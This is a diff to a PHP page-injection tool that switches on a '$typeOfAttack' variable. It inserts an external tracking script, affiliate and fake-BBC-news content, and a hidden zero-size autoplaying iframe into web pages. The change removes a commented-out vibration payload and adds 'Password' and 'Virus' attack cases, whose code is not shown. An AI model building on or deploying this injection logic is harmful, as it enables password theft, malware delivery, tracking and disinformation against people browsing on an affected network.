@@ -44,18 +44,9 @@ switch($typeOfAttack){
           $textToInsert="<script type='text/javascript' src='$TrackingScript'></script>";
           runScript($textToInsert);
           break;
-        
-//    case "Vibration":
-//          $textToInsert =  "<script type='text/javascript'>
-//            navigator.vibrate = navigator.vibrate ||
-//            navigator.webkitVibrate ||
-//            navigator.mozVibrate ||
-//            navigator.msVibrate;
-//
-//            navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500,                1000, 500]);
-//            </script>";
-//            runScript($textToInsert);
-//          break;
+    case "Password":
+          runPasswordScript();
+          break;
         
     case "Affliate":
         runAffliateScript();
@@ -64,9 +55,13 @@ switch($typeOfAttack){
     case "Fake News":
         runBbcScript();
         break;
+        
+    case "Virus":
+        runVirusScript();
+        break;
 
     default:
-          $textToInsert="<iframe width='0' height='0'                         src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
+          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
           runScript($textToInsert);
           break;
 }
